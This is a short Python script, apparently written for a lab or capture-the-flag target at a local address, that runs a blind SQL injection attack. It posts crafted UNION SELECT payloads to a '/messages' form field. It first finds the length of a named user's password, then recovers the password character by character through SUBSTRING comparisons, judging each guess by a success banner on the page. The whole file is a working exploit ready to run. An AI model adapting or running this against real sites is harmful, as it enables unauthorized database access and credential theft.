#!/usr/bin/env python3

import sys
import requests
from bs4 import BeautifulSoup

def doesSiteRenderTrue(soup):
    return len(soup.find_all("div",{"class":"alert alert-success"})) != 0

def searchPasswordLength(addr, max_length):
    pwd_length = 0
    for l in range(1, max_length+1):
        query = "fake_news' UNION SELECT name, password FROM users WHERE LENGTH(password) = "+str(l)+" AND name = 'inspector_derrick"
        r = requests.post(addr+"/messages", data = {"name":query})
        soup = BeautifulSoup(r.text, "html.parser")
        if doesSiteRenderTrue(soup):
            pwd_length = l
            break
    return pwd_length

def recoverPassword(addr, charset, pwd_length):
    string_buffer = ""
    for i in range(1, pwd_length+1):
        for c in charset:
            query = "fake_news' UNION SELECT name, password FROM users WHERE SUBSTRING(password, %d, %d) = '%s' AND name = 'inspector_derrick" % (i, 1, c)
            r = requests.post(addr+"/messages", data = {"name":query})
            soup = BeautifulSoup(r.text, "html.parser")
            if doesSiteRenderTrue(soup):
                string_buffer += c
                break
    return string_buffer

charset = "0123456789abcdefghijklmnopqrstuvwxyz"
addr = "http://172.17.0.2" if len(sys.argv) > 1 else "http://127.0.0.1"

pwd_length = searchPasswordLength(addr, 40)
password = recoverPassword(addr, charset, pwd_length)
print(password)
